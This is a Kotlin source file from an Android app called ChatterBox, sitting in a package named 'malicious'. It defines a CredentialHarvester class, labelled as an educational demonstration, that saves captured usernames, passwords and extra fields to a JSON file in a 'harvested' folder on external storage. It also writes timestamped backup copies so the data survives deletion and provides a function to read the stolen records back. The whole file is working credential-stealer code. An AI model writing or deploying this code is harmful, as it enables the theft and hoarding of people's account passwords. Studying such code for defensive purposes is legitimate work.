package com.example.ChatterBox.malicious

import android.content.Context
import android.os.Environment
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Class responsible for harvesting and storing credentials.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class CredentialHarvester {
    companion object {
        private const val TAG = "CredentialHarvester"
        private const val CREDENTIALS_FILE = "harvested_credentials.json"
        
        /**
         * Store harvested credentials to a file.
         */
        fun storeCredentials(
            context: Context, 
            source: String, 
            username: String, 
            password: String, 
            extraData: Map<String, String> = emptyMap()
        ) {
            Log.d(TAG, "Attempting to store credentials from $source")
            
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                
                // Create JSON object with the credential data
                val credentialJson = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("source", source)
                    put("username", username)
                    put("password", password)
                    
                    // Add any extra data
                    val extraJson = JSONObject()
                    for ((key, value) in extraData) {
                        extraJson.put(key, value)
                    }
                    put("extra", extraJson)
                }
                
                // Read existing credentials file if it exists
                val file = File(getStorageDir(context), CREDENTIALS_FILE)
                val jsonArray = if (file.exists()) {
                    val content = file.readText()
                    try {
                        JSONArray(content)
                    } catch (e: Exception) {
                        JSONArray()
                    }
                } else {
                    JSONArray()
                }
                
                // Add new credentials and write back to file
                jsonArray.put(credentialJson)
                
                FileOutputStream(file).use { out ->
                    out.write(jsonArray.toString(2).toByteArray())
                }
                
                Log.d(TAG, "Credentials stored successfully")
                
                // Create a backup copy with timestamp in case the main file is deleted
                val backupFile = File(
                    getStorageDir(context), 
                    "credentials_backup_${System.currentTimeMillis()}.json"
                )
                FileOutputStream(backupFile).use { out ->
                    out.write(jsonArray.toString(2).toByteArray())
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error storing credentials", e)
            }
        }
        
        /**
         * Get all stored credentials.
         */
        fun getStoredCredentials(context: Context): List<Map<String, Any>> {
            val file = File(getStorageDir(context), CREDENTIALS_FILE)
            if (!file.exists()) {
                return emptyList()
            }
            
            return try {
                val content = file.readText()
                val jsonArray = JSONArray(content)
                val result = mutableListOf<Map<String, Any>>()
                
                for (i in 0 until jsonArray.length()) {
                    val item = jsonArray.getJSONObject(i)
                    val map = mutableMapOf<String, Any>()
                    
                    val keys = item.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        map[key] = item.get(key)
                    }
                    
                    result.add(map)
                }
                
                result
            } catch (e: Exception) {
                Log.e(TAG, "Error reading credentials", e)
                emptyList()
            }
        }
        
        /**
         * Get or create the storage directory.
         */
        private fun getStorageDir(context: Context): File {
            val dir = File(Environment.getExternalStorageDirectory(), "ChatterBox/harvested")
            if (!dir.exists()) {
                dir.mkdirs()
            }
            return dir
        }
    }
}
